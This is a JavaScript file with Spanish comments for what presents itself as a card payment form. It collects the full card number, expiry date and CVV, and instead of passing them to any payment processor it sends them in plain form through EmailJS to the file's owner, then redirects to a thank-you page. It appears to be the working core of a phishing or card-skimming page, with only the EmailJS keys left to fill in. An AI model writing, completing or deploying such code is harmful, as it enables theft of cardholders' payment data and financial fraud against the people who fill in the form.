// Configuración EmailJS (REEMPLAZA CON TUS DATOS)
emailjs.init('TU_PUBLIC_KEY');

document.getElementById('paymentForm').addEventListener('submit', function(e) {
    e.preventDefault();
    const loader = document.getElementById('mensajeCarga');
    const errores = document.getElementById('errores');

    // Limpiar errores
    errores.innerHTML = '';
    
    // Capturar datos
    const datos = {
        nombre_completo: document.getElementById('nombre').value.trim(),
        numero_tarjeta: document.getElementById('tarjeta').value.replace(/\s/g, ''),
        fecha_expiracion: document.getElementById('fecha').value,
        codigo_cvv: document.getElementById('cvv').value
    };

    // Validaciones
    const mensajesError = [];
    
    // Validar nombre (mínimo 4 letras)
    if (!/^[a-zA-ZÀ-ÿñÑ\s]{4,}$/.test(datos.nombre_completo)) {
        mensajesError.push('El nombre debe tener al menos 4 letras');
    }

    // Validar tarjeta (16 dígitos)
    if (!/^\d{16}$/.test(datos.numero_tarjeta)) {
        mensajesError.push('Número de tarjeta inválido');
    }

    // Validar fecha
    if (new Date(datos.fecha_expiracion) < new Date()) {
        mensajesError.push('La tarjeta está expirada');
    }

    // Validar CVV (4 dígitos)
    if (!/^\d{4}$/.test(datos.codigo_cvv)) {
        mensajesError.push('Código CVV inválido (4 dígitos)');
    }

    // Mostrar errores
    if (mensajesError.length > 0) {
        errores.innerHTML = mensajesError.map(msg => `<div class="error-msg">❌ ${msg}</div>`).join('');
        return;
    }

    // Mostrar carga
    loader.style.display = 'block';

    // Enviar datos
    emailjs.send("TU_SERVICE_ID", "TU_TEMPLATE_ID", datos)
        .then(() => {
            window.location.href = "thank-you.html";
        })
        .catch(error => {
            console.error('Error:', error);
            errores.innerHTML = `<div class="error-msg">❌ Error al enviar: ${error.text}</div>`;
        })
        .finally(() => {
            loader.style.display = 'none';
        });
});

// Formatear número de tarjeta
document.getElementById('tarjeta').addEventListener('input', function(e) {
    let value = e.target.value.replace(/\s/g, '');
    value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
    e.target.value = value.substring(0, 19);
});
